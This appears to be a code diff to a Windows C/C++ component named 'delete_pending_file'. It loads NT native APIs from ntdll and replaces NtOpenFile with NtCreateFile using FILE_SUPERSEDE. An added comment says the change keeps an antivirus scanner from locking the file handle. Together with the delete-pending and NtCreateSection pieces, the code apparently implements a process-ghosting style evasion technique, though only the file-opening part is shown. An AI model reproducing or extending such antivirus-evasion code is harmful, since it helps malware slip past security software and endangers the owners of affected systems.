@@ -41,13 +41,18 @@ typedef struct _FILE_DISPOSITION_INFORMATION {
 } FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;
 
 /* NT API function pointers */
-typedef long(NTAPI *pNtOpenFile)(
+typedef long(NTAPI *pNtCreateFile)(
     void **FileHandle,
     unsigned long DesiredAccess,
     POBJECT_ATTRIBUTES ObjectAttributes,
     PIO_STATUS_BLOCK IoStatusBlock,
+    PLARGE_INTEGER AllocationSize,
+    unsigned long FileAttributes,
     unsigned long ShareAccess,
-    unsigned long OpenOptions
+    unsigned long CreateDisposition,
+    unsigned long CreateOptions,
+    void *EaBuffer,
+    unsigned long EaLength
 );
 
 typedef long(NTAPI *pNtWriteFile)(
@@ -83,7 +88,7 @@ typedef long(NTAPI *pNtCreateSection)(
 typedef long(NTAPI *pNtClose)(void *Handle);
 
 /* Load NT APIs at runtime */
-static pNtOpenFile g_NtOpenFile = nullptr;
+static pNtCreateFile g_NtCreateFile = nullptr;
 static pNtWriteFile g_NtWriteFile = nullptr;
 static pNtSetInformationFile g_NtSetInformationFile = nullptr;
 static pNtCreateSection g_NtCreateSection = nullptr;
@@ -91,18 +96,18 @@ static pNtClose g_NtClose = nullptr;
 
 static bool load_delete_pending_apis()
 {
-    if (g_NtOpenFile) return true;
+    if (g_NtCreateFile) return true;
 
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) return false;
 
-    g_NtOpenFile = (pNtOpenFile)GetProcAddress(hNtdll, "NtOpenFile");
+    g_NtCreateFile = (pNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
     g_NtWriteFile = (pNtWriteFile)GetProcAddress(hNtdll, "NtWriteFile");
     g_NtSetInformationFile = (pNtSetInformationFile)GetProcAddress(hNtdll, "NtSetInformationFile");
     g_NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
     g_NtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");
 
-    return g_NtOpenFile && g_NtWriteFile && g_NtSetInformationFile && g_NtCreateSection && g_NtClose;
+    return g_NtCreateFile && g_NtWriteFile && g_NtSetInformationFile && g_NtCreateSection && g_NtClose;
 }
 
 HANDLE open_file(wchar_t* filePath)
@@ -129,16 +134,23 @@ HANDLE open_file(wchar_t* filePath)
     IO_STATUS_BLOCK status_block = {0};
     void *file = nullptr;
 
-    NTSTATUS stat = g_NtOpenFile(&file,
+    /* Use NtCreateFile with FILE_SUPERSEDE disposition: atomically creates or replaces
+       the file in a single kernel call, leaving no window between creation and our
+       exclusive open for an AV scanner to lock the handle. */
+    NTSTATUS stat = g_NtCreateFile(&file,
         DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
         &attr,
         &status_block,
+        nullptr,                        /* AllocationSize */
+        FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
-        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
+        FILE_SUPERSEDE,                 /* CreateDisposition: create or replace */
+        FILE_SYNCHRONOUS_IO_NONALERT,   /* CreateOptions */
+        nullptr, 0                      /* EaBuffer, EaLength */
     );
 
     if (!NT_SUCCESS(stat)) {
-        printf("[delete_pending_file] NtOpenFile failed: 0x%lX\n", stat);
+        printf("[delete_pending_file] NtCreateFile failed: 0x%lX\n", stat);
         return nullptr;
     }
 
